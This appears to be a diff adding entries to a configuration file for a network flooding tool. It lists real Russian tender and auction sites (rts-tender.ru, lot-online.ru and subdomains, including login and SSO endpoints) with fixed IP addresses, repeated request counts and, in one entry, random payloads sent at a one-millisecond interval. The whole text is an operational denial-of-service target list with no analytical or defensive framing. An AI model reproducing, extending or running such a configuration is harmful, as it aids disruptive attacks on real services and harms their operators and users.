+        "address": "185.179.85.96:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://it2-auth.rts-tender.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.179.85.96:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://market-lk.rts-tender.ru/api/common/v1/sso/login/participantCustomer?sso=1&code=-5"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.179.85.34:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://market-lk.rts-tender.ru/api/common/v1/sso/login/participantCustomer?sso=1&code=-5"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.179.85.34:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://lot-online.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.104.243.71:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://lot-online.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.104.243.71:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://privatization.lot-online.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.104.243.71:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://privatization.lot-online.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.104.243.71:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://rad.lot-online.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.104.243.71:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://rad.lot-online.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.104.243.71:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://agents.lot-online.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.104.243.71:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://agents.lot-online.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.104.243.71:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://gz.lot-online.ru/etp_front/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.104.243.237:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://gz.lot-online.ru/etp_front/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.104.243.237:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://gz.lot-online.ru/etp_front/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.104.243.137:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://gz.lot-online.ru/etp_front/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.104.243.137:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://catalog.lot-online.ru/index.php?dispatch=rad_auth.login_form"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.104.243.114:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 15,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://catalog.lot-online.ru/index.php?dispatch=rad_auth.login_form"
+        },
+        "client": {
+          "static_host": {
+            "addr": "193.104.243.114:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }
+  ]
 }
